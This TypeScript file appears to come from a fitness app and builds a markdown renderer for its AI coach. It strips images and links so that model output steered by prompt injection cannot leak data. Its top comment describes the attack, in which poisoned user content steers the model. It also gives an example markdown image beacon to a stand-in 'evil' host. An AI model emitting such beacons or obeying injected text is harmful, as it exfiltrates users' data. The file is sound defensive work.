'use client'

import { defaultRehypePlugins, Streamdown, type StreamdownProps } from 'streamdown'

/**
 * The coach's markdown renderer, with the exfiltration channel closed.
 *
 * Model output is UNTRUSTED: the coach's read tools pull user-authored
 * content into context (an adopted shared program's description, exercise
 * notes), so a poisoned string can steer what the model emits. Streamdown's
 * DEFAULT harden config is fully open — allowedImagePrefixes ['*'],
 * allowedLinkPrefixes ['*'] — which lets a steered `![](https://evil/?d=…)`
 * auto-load in the victim's browser: an exfil beacon that needs no click.
 *
 * In streamdown 2.5.0 the allowlists are NOT top-level props; they are the
 * options of the bundled rehype-harden plugin, and passing `rehypePlugins`
 * replaces the default chain outright. So this rebuilds the same chain —
 * raw → sanitize → harden — swapping only the harden options. The named
 * `defaultRehypePlugins` keys keep streamdown's own raw/sanitize configs
 * (tel: links, code metastring) exactly as shipped.
 */

type RehypePlugins = NonNullable<StreamdownProps['rehypePlugins']>

const { raw, sanitize, harden: hardenEntry } = defaultRehypePlugins
// The shipped entry is [plugin, openConfig]; keep the plugin, drop the config.
const harden = Array.isArray(hardenEntry) ? hardenEntry[0] : hardenEntry

// A streamdown upgrade that renames these keys must fail loudly here, not
// silently ship the open defaults (same stance as the coach model check:
// misconfiguration fails at the seam, not mid-stream).
if (!raw || !sanitize || !harden) {
  throw new Error('streamdown defaultRehypePlugins no longer exposes raw/sanitize/harden')
}

export const COACH_MARKDOWN_HARDENING = {
  // No image is legitimate coach output, and a markdown image is the one
  // vector that fires WITHOUT a click. Empty allowlist blocks them all;
  // 'remove' drops the node silently rather than rendering the attacker a
  // "[Image blocked]" chip (silence over corruption).
  allowedImagePrefixes: [] as string[],
  allowDataImages: false,
  imageBlockPolicy: 'remove',
  // Links flatten to their text: rehype-harden cannot express "any https
  // host" as a prefix, a specific allowlist demands a canonical origin the
  // app does not define, and the coach talks in numbers and set schemes —
  // it has no link vocabulary to lose. Revisit if the coach ever needs to
  // deep-link (allowlist the app origin, never a wildcard).
  allowedLinkPrefixes: [] as string[],
  linkBlockPolicy: 'text-only',
} as const

// The tuple's settings type is opaque on streamdown's side (Pluggable), so
// the chain needs one assertion; coach-markdown.test.tsx pins the behaviour
// the types cannot.
const COACH_REHYPE_PLUGINS = [
  raw,
  sanitize,
  [harden, COACH_MARKDOWN_HARDENING],
] as unknown as RehypePlugins

export function CoachMarkdown({ children }: { children: string }) {
  return <Streamdown rehypePlugins={COACH_REHYPE_PLUGINS}>{children}</Streamdown>
}
